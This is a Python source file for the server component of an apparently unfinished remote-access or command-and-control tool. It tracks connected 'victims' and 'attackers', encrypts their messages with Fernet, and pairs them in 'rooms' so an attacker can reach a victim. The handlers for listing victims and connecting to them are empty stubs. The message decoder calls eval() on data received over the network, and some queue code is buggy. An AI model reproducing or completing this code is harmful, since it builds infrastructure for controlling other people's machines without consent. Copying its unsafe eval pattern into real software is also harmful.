from datetime import datetime

from .setting import *
from cryptography.fernet import Fernet
import socket
from .STATUS_CODE import *


def log(*msges):
    msg = ""
    for m in msges:
        msg += str(m) + ' '
    msg = "[*] {} ".format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")) + msg
    print(msg)
    with open(LOG_FILE_SERVER, 'a') as f:
        f.write(msg + '\n')


class MyQueue:
    def __init__(self):
        self.queue = []

    def add(self, item):
        self.queue.append(item)

    def remove(self, index):
        self.queue.pop(index)

    def get_queue(self):
        return self.queue

    def is_active(self, connection,address):
        try:
            connection.send(b"Ok")
            return True
        except Exception as e:
            log("Victim {} was Disconnected".format(address))
            return False

    def checkActiveVictim(self):
        remove = []
        for index, victim in self.queue:
            if self.is_active(victim[0],victim[1]) == False:
                remove.append(index)
                log("Victim {} is not active".format(victim[1]))
        for index in remove:
            self.remove(index)

    def get_size(self):
        return len(self.queue)

    def RmvAddress(self,address):
        for index, victim in enumerate(self.queue):
            if victim[1] == address:
                self.queue.pop(index)
                return True

class Server:
    def __init__(self):
        self.ip = ip
        self.port = port
        self.Address = (self.ip, self.port)
        self.fernet = Fernet(ENCRYPTION_KEY)
        self.victimQueue = MyQueue()
        self.AttackerQueue = MyQueue()
        self.BufferSize = BufferSize
        self.Socket = None
        self.RID = 0
        self.Rooms = []

    def SocketMaking(self):
        try:
            self.Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            return True
        except socket.error as msg:
            log("Error at SocketMaking :: \n", msg)

    def Binding(self):

        try:
            log("Binding to port = ", self.port)
            self.Socket.bind(self.Address)
        except socket.error as msg:
            log("Fail to Bind \ntrying again....")
            log(msg)

    def HandleConnection(self, conn, address):
        try:
            MSG = self.decryptMsg(conn.recv(self.BufferSize))
            print(MSG)
            if MSG['CODE'] == VICTIM_CODE:
                self.sendMsg(conn, MSG_TEMPLATE(status=CONNECTED_CODE, msg="Connected", CODE=VICTIM_CODE))
                self.victimQueue.add((conn, address))
                log("Victim {} is connected".format(address))
            elif MSG['CODE'] == ATTACKER_CODE:
                self.sendMsg(conn, MSG_TEMPLATE(status=CONNECTED_CODE, msg="Connected", CODE=ATTACKER_CODE))
                self.AttackerQueue.add((conn, address))
        except Exception as msg:
            log("Error at HandleConnection :: ", msg)

    def decryptMsg(self, msg):
        msg = self.fernet.decrypt(msg)
        msg = msg.decode('utf-8')
        return eval(msg)

    def sendMsg(self, conn, msg):
        msg = str(msg).encode('utf-8')
        msg = self.fernet.encrypt(msg)
        conn.send(msg)


    def LisntentoAttacker(self, conn, address):
        while  True:
            try:
                MSG = self.decryptMsg(conn.recv(self.BufferSize))
                if MSG["status"] == LIST_OF_VICTIMS:
                    pass
                elif MSG["status"] == MAKE_CONNECTION_TO_VICTIM:
                    pass

            except Exception as msg:
                log("Error at LisntentoAttacker :: ", msg)
                self.AttackerQueue.RmvAddress(address)
                return

    def Start(self):
        self.Socket.listen()
        log(f"Server is listening on {self.ip}")
        while True:
            conn, address = self.Socket.accept()
            log(f"NEW CONNECTION FROM {address} ")
            self.HandleConnection(conn, address)

    def CreateRoom(self, Attacker, Victim):
        self.RID += 1
        log(f"Room {self.RID} is created")
        self.Rooms.append([Attacker, Victim, self.RID])
